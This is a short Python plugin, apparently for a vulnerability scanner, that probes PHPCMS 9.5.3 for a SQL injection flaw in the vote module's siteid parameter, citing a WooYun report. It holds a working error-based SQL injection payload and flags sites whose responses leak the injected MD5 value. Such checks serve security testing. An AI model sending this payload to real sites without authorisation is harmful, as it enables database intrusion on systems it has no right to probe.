#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = sharecast
#__Service_ = phpcms
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-051077
#___Type___ = 注入
#___name___ = PHPCMS 9.5.3 vote_tag.class.php SQL注入漏洞
'''
PHPCMS 9.5.3 /phpcms/modules/vote/classes/vote_tag.class.php 文件siteid变量可控
需register_globals=on
'''


def assign(service, arg):
    if service == "phpcms":
        return True, arg


def audit(arg):
    payload = "index.php?m=vote&c=index&siteid=1%27%20and%20(select%201%20from%20%20(select%20count(*),concat(md5(123),floor(rand(0)*2))x%20from%20%20information_schema.tables%20group%20by%20x)a)%20%23"
    url = arg + payload
    code, head, res, errcode, _ = curl.curl('%s' % url)
    if code == 200 and '202cb962ac59075b964b07152d234b701' in res:
        security_hole(url)


if __name__ == '__main__':
    from dummy import *
    audit(assign('phpcms', 'http://www.example.com/')[1])